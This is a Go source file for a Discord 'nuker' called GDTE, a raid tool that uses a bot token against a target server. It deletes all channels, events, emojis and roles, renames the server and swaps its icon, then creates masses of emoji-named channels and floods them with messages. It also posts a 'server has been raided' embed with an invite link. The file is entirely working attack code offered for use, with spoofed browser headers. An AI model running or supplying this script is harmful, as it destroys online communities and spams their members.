package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	RESET        = "\033[0m"
	CLEAR_SCREEN = "\033[2J\033[H"
	HIDE_CURSOR  = "\033[?25l"
	SHOW_CURSOR  = "\033[?25h"
	API_BASE     = "https://discord.com/api/v9"
)

var GRADIENT = []int{196, 202, 208, 214, 220, 226, 190, 154, 118, 82, 46, 47, 48, 49, 50, 51, 45, 39, 33, 27, 21, 57, 93, 129, 165, 201, 200, 199, 198, 197}

var gradPos int
var gradMu sync.Mutex

func nextColor() int {
	gradMu.Lock()
	defer gradMu.Unlock()
	c := GRADIENT[gradPos%len(GRADIENT)]
	gradPos++
	return c
}

func resetGradient() {
	gradMu.Lock()
	gradPos = 0
	gradMu.Unlock()
}

func gradientString(s string) string {
	var b strings.Builder
	for _, ch := range s {
		if ch == '\n' || ch == '\r' {
			b.WriteRune(ch)
			continue
		}
		b.WriteString(fmt.Sprintf("\033[38;5;%dm%c", nextColor(), ch))
	}
	b.WriteString(RESET)
	return b.String()
}

func logOK(action, detail string) {
	t := time.Now().Format("15:04:05.000")
	resetGradient()
	msg := fmt.Sprintf("[%s][+]%s -> %s", t, action, detail)
	fmt.Println(gradientString(msg))
}

func logFAIL(action, detail string) {
	t := time.Now().Format("15:04:05.000")
	resetGradient()
	msg := fmt.Sprintf("[%s][-]%s -> %s", t, action, detail)
	fmt.Println(gradientString(msg))
}

func logInfo(msg string) {
	resetGradient()
	fmt.Println(gradientString(msg))
}

func logQuestion(prompt string) string {
	resetGradient()
	fmt.Print(gradientString("[?] " + prompt))
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func logIntQuestion(prompt string) int {
	for {
		resetGradient()
		fmt.Print(gradientString("[?] " + prompt))
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		val, err := strconv.Atoi(input)
		if err == nil && val >= 0 {
			return val
		}
		logInfo("[-] Invalid number. Please try again.")
	}
}

func logHexQuestion(prompt string) int {
	for {
		resetGradient()
		fmt.Print(gradientString("[?] " + prompt))
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if strings.HasPrefix(input, "0x") || strings.HasPrefix(input, "0X") {
			input = input[2:]
		}
		val, err := strconv.ParseInt(input, 16, 64)
		if err == nil {
			return int(val)
		}
		logInfo("[-] Invalid hex color. Please try again.")
	}
}

func clearScreen() {
	fmt.Print(CLEAR_SCREEN)
	fmt.Print(HIDE_CURSOR)
}

func showCursor() {
	fmt.Print(SHOW_CURSOR)
}

var FACE_EMOJIS = []string{
	"\U0001F600", "\U0001F603", "\U0001F604", "\U0001F601", "\U0001F606", "\U0001F605", "\U0001F602", "\U0001F923", "\U0001F60A", "\U0001F607",
	"\U0001F642", "\U0001F643", "\U0001F609", "\U0001F60C", "\U0001F60D", "\U0001F970", "\U0001F618", "\U0001F617", "\U0001F619", "\U0001F61A",
	"\U0001F60B", "\U0001F61B", "\U0001F61D", "\U0001F61C", "\U0001F92A", "\U0001F928", "\U0001F9D0", "\U0001F913", "\U0001F60E", "\U0001F929",
	"\U0001F973", "\U0001F60F", "\U0001F612", "\U0001F61E", "\U0001F614", "\U0001F61F", "\U0001F615", "\U0001F641", "\U00002639\U0000FE0F", "\U0001F623",
	"\U0001F616", "\U0001F62B", "\U0001F629", "\U0001F97A", "\U0001F622", "\U0001F62D", "\U0001F624", "\U0001F620", "\U0001F621", "\U0001F92C",
}

func downloadToBase64(url string) string {
	if url == "" {
		return ""
	}
	resp, err := http.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	contentType := resp.Header.Get("Content-Type")
	if contentType == "" {
		contentType = "image/png"
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("data:%s;base64,%s", contentType, b64)
}

func loadFile(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func loadChannelNames() []string {
	file, err := os.Open("ch.txt")
	if err != nil {
		logInfo("[-] ch.txt not found, using default names")
		return []string{"channel-"}
	}
	defer file.Close()
	var names []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			names = append(names, line)
		}
	}
	if len(names) == 0 {
		return []string{"channel-"}
	}
	return names
}

func generateChannelName(baseNames []string) string {
	base := baseNames[rand.Intn(len(baseNames))]
	var sb strings.Builder
	for j := 0; j < 10; j++ {
		sb.WriteString(FACE_EMOJIS[rand.Intn(len(FACE_EMOJIS))])
	}
	return base + sb.String()
}

type DiscordClient struct {
	token      string
	httpClient *http.Client
}

func NewDiscordClient(token string) *DiscordClient {
	return &DiscordClient{
		token:      token,
		httpClient: &http.Client{Timeout: 30 * time.Second},
	}
}

func (c *DiscordClient) request(method, endpoint string, body []byte) (*http.Response, error) {
	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, API_BASE+endpoint, bodyReader)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bot "+c.token)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Origin", "https://discord.com")
	req.Header.Set("Referer", "https://discord.com/channels/@me")
	req.Header.Set("X-Discord-Locale", "en-US")
	req.Header.Set("X-Discord-Timezone", "America/New_York")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	return c.httpClient.Do(req)
}

func (c *DiscordClient) getJSONArray(endpoint string) ([]map[string]interface{}, error) {
	resp, err := c.request("GET", endpoint, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	var result []map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}
	return result, nil
}

func (c *DiscordClient) delete(endpoint string) error {
	resp, err := c.request("DELETE", endpoint, nil)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("status %d: %s", resp.StatusCode, string(body))
	}
	return nil
}

func (c *DiscordClient) postJSON(endpoint string, payload map[string]interface{}) (map[string]interface{}, error) {
	body, _ := json.Marshal(payload)
	resp, err := c.request("POST", endpoint, body)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
		return nil, fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
	}
	var result map[string]interface{}
	if len(respBody) > 0 {
		json.Unmarshal(respBody, &result)
	}
	return result, nil
}

func (c *DiscordClient) patchJSON(endpoint string, payload map[string]interface{}) (map[string]interface{}, error) {
	body, _ := json.Marshal(payload)
	resp, err := c.request("PATCH", endpoint, body)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		return nil, fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
	}
	var result map[string]interface{}
	if len(respBody) > 0 {
		json.Unmarshal(respBody, &result)
	}
	return result, nil
}

func main() {
	clearScreen()
	defer showCursor()

	asciiLines := []string{
		"  ____ ____ _____ _____               _             ",
		" / ___|  _ \\_   _| ____|  _ __  _   _| | _____ _ __ ",
		"| |  _| | | || | |  _|   | '_ \\| | | | |/ / _ \\ '__|",
		"| |_| | |_| || | | |___  | | | | |_| |   <  __/ |   ",
		" \\____|____/ |_| |_____| |_| |_|\\__,_|_|\\_\\___|_|   ",
	}
	for _, line := range asciiLines {
		resetGradient()
		fmt.Println(gradientString(line))
	}
	fmt.Println()

	token := loadFile("bot.txt")
	if token == "" {
		logInfo("[-] bot.txt not found or empty!")
		logInfo("[i] Please create bot.txt with your bot token.")
		showCursor()
		return
	}
	logInfo("[+] Bot token loaded from bot.txt")

	messageContent := loadFile("me.txt")
	if messageContent == "" {
		logInfo("[-] me.txt not found or empty!")
		logInfo("[i] Please create me.txt with your message content.")
		showCursor()
		return
	}
	logInfo("[+] Message content loaded from me.txt")

	fmt.Println()
	logInfo("Configuration")
	fmt.Println()

	guildID := logQuestion("Enter target Guild ID: ")
	if guildID == "" {
		logInfo("[-] Guild ID is required!")
		showCursor()
		return
	}

	channelCount := logIntQuestion("Enter number of channels to create: ")
	channelNames := loadChannelNames()
	logInfo(fmt.Sprintf("[+] Loaded %d base channel names from ch.txt", len(channelNames)))

	messagesPerChannel := logIntQuestion("Enter messages per channel: ")

	roleName := logQuestion("Enter role name: ")
	roleCount := logIntQuestion("Enter number of roles to create: ")
	roleColor := logHexQuestion("Enter role color (hex, e.g., DC143C): ")

	serverName := logQuestion("Enter new server name: ")
	iconURL := logQuestion("Enter server icon URL (or leave empty): ")

	fmt.Println()
	logInfo("Summary")
	logInfo(fmt.Sprintf("[i] Guild ID: %s", guildID))
	logInfo(fmt.Sprintf("[i] Channels: %d", channelCount))
	logInfo(fmt.Sprintf("[i] Messages/Channel: %d", messagesPerChannel))
	logInfo(fmt.Sprintf("[i] Roles: %d x %s", roleCount, roleName))
	logInfo(fmt.Sprintf("[i] Role Color: #%06X", roleColor))
	logInfo(fmt.Sprintf("[i] Server Name: %s", serverName))
	fmt.Println()

	logQuestion("Press ENTER to start nuke...")

	client := NewDiscordClient(token)

	me, err := client.getJSONArray("/users/@me")
	if err != nil {
		logInfo(fmt.Sprintf("[-] Authentication failed: %v", err))
		showCursor()
		return
	}
	if len(me) == 0 {
		logInfo("[-] Authentication failed")
		showCursor()
		return
	}
	username := "Bot"
	if u, ok := me[0]["username"].(string); ok {
		username = u
	}
	logInfo(fmt.Sprintf("[+] %s is connected!", username))

	go nukeGuild(client, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, messagesPerChannel, channelNames, messageContent)

	logInfo("[i] Bot is running. Press Ctrl+C to exit.")
	select {}
}

func nukeGuild(client *DiscordClient, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount, messagesPerChannel int, channelNames []string, messageContent string) {
	startTime := time.Now()
	fmt.Println()
	logInfo("NUKE STARTED")
	fmt.Println()

	go func() {
		iconBase64 := downloadToBase64(iconURL)
		payload := map[string]interface{}{"name": serverName}
		if iconBase64 != "" {
			payload["icon"] = iconBase64
		}
		_, err := client.patchJSON("/guilds/"+guildID, payload)
		if err != nil {
			logFAIL("server edit", err.Error())
		} else {
			logOK("server edit", serverName)
		}
	}()

	channels, err := client.getJSONArray("/guilds/" + guildID + "/channels")
	if err != nil {
		logFAIL("get channels", err.Error())
	} else {
		var chWg sync.WaitGroup
		for _, ch := range channels {
			chID, _ := ch["id"].(string)
			chName, _ := ch["name"].(string)
			if chID == "" {
				continue
			}
			chWg.Add(1)
			go func(id, name string) {
				defer chWg.Done()
				err := client.delete("/channels/" + id)
				if err != nil {
					logFAIL("channel delete", name)
				} else {
					logOK("channel delete", name)
				}
			}(chID, chName)
		}
		chWg.Wait()
	}

	events, err := client.getJSONArray("/guilds/" + guildID + "/scheduled-events")
	if err == nil {
		var evWg sync.WaitGroup
		for _, ev := range events {
			eID, _ := ev["id"].(string)
			if eID == "" {
				continue
			}
			evWg.Add(1)
			go func(id string) {
				defer evWg.Done()
				_ = client.delete("/guilds/" + guildID + "/scheduled-events/" + id)
			}(eID)
		}
		evWg.Wait()
	}

	emojis, err := client.getJSONArray("/guilds/" + guildID + "/emojis")
	if err == nil {
		var emojiWg sync.WaitGroup
		for _, em := range emojis {
			eID, _ := em["id"].(string)
			if eID == "" {
				continue
			}
			emojiWg.Add(1)
			go func(id string) {
				defer emojiWg.Done()
				_ = client.delete("/guilds/" + guildID + "/emojis/" + id)
			}(eID)
		}
		emojiWg.Wait()
	}

	createdChannelIDs := make([]string, 0, channelCount)
	if channelCount > 0 {
		logInfo(fmt.Sprintf("[i] Creating %d channels at MAXIMUM SPEED...", channelCount))
		preGeneratedNames := make([]string, channelCount)
		for i := 0; i < channelCount; i++ {
			preGeneratedNames[i] = generateChannelName(channelNames)
		}

		var chMu sync.Mutex
		var chCreateWg sync.WaitGroup

		for i, name := range preGeneratedNames {
			chCreateWg.Add(1)
			go func(idx int, n string) {
				defer chCreateWg.Done()
				result, err := client.postJSON("/guilds/"+guildID+"/channels", map[string]interface{}{
					"name": n,
					"type": 0,
				})
				if err != nil {
					logFAIL("channel make", err.Error())
				} else {
					chID, _ := result["id"].(string)
					if chID != "" {
						chMu.Lock()
						createdChannelIDs = append(createdChannelIDs, chID)
						chMu.Unlock()
					}
					logOK("channel make", n)
				}
			}(i, name)
		}
		chCreateWg.Wait()
		logInfo(fmt.Sprintf("[+] Created %d/%d channels!", len(createdChannelIDs), channelCount))
	}

	if messagesPerChannel > 0 && len(createdChannelIDs) > 0 {
		totalMsgs := len(createdChannelIDs) * messagesPerChannel
		logInfo(fmt.Sprintf("[i] Sending %d messages at MAXIMUM SPEED...", totalMsgs))
		var msgWg sync.WaitGroup
		msgSuccess := 0
		msgErr := 0
		var msgMu sync.Mutex

		for _, chID := range createdChannelIDs {
			for i := 0; i < messagesPerChannel; i++ {
				msgWg.Add(1)
				go func(id string) {
					defer msgWg.Done()
					_, err := client.postJSON("/channels/"+id+"/messages", map[string]interface{}{
						"content": messageContent,
					})
					if err != nil {
						msgMu.Lock()
						msgErr++
						msgMu.Unlock()
						logFAIL("message false", err.Error())
					} else {
						msgMu.Lock()
						msgSuccess++
						msgMu.Unlock()
						logOK("message ok", id)
					}
				}(chID)
			}
		}
		msgWg.Wait()
		logInfo(fmt.Sprintf("[+] Sent %d/%d messages (errors: %d)!", msgSuccess, totalMsgs, msgErr))
	}

	logInfo("[i] Sending embed to rules channel...")
	channels, err = client.getJSONArray("/guilds/" + guildID + "/channels")
	var rulesChID string
	if err == nil {
		for _, ch := range channels {
			chName, _ := ch["name"].(string)
			chID, _ := ch["id"].(string)
			if strings.Contains(strings.ToLower(chName), "rules") || strings.Contains(strings.ToLower(chName), "rule") {
				rulesChID = chID
				break
			}
		}
	}

	if rulesChID != "" {
		_, err := client.postJSON("/channels/"+rulesChID+"/messages", map[string]interface{}{
			"embeds": []map[string]interface{}{
				{
					"title":       "GDTEnuker",
					"description": "This server has been raided by **GDTE**!\n\nWe are unstoppable.\nJoin: https://discord.gg/TbkZR5fhUs",
					"color":       0x242929,
					"thumbnail": map[string]string{
						"url": "https://cdn.discordapp.com/attachments/1514638682664210705/1515732847493906482/Screenshot_2026-06-14_235923.png",
					},
					"footer": map[string]string{
						"text": "@everyone https://github.com/agehantonu/GDTE-nuker",
					},
					"timestamp": time.Now().Format(time.RFC3339),
				},
			},
		})
		if err != nil {
			logFAIL("embed send", err.Error())
		} else {
			logOK("embed send", rulesChID)
		}
	} else {
		logFAIL("embed send", "no rules channel found")
	}

	roles, err := client.getJSONArray("/guilds/" + guildID + "/roles")
	if err == nil {
		var roleDelWg sync.WaitGroup
		for _, role := range roles {
			rID, _ := role["id"].(string)
			rName, _ := role["name"].(string)
			if rID == "" || rID == guildID {
				continue
			}
			managed, _ := role["managed"].(bool)
			if managed {
				continue
			}
			roleDelWg.Add(1)
			go func(id, name string) {
				defer roleDelWg.Done()
				err := client.delete("/guilds/" + guildID + "/roles/" + id)
				if err != nil {
					logFAIL("role delete", name)
				} else {
					logOK("role delete", name)
				}
			}(rID, rName)
		}
		roleDelWg.Wait()
	}

	if roleCount > 0 {
		logInfo(fmt.Sprintf("[i] Creating %d roles at MAXIMUM SPEED...", roleCount))
		var roleCreateWg sync.WaitGroup
		for i := 0; i < roleCount; i++ {
			roleCreateWg.Add(1)
			go func(idx int) {
				defer roleCreateWg.Done()
				_, err := client.postJSON("/guilds/"+guildID+"/roles", map[string]interface{}{
					"name":        roleName,
					"color":       roleColor,
					"hoist":       true,
					"mentionable": true,
				})
				if err != nil {
					logFAIL("role make", err.Error())
				} else {
					logOK("role make", roleName)
				}
			}(i)
		}
		roleCreateWg.Wait()
	}

	fmt.Println()
	logInfo("NUKE COMPLETE")
	logInfo(fmt.Sprintf("[+] Total execution time: %v", time.Since(startTime)))
	fmt.Println()
}
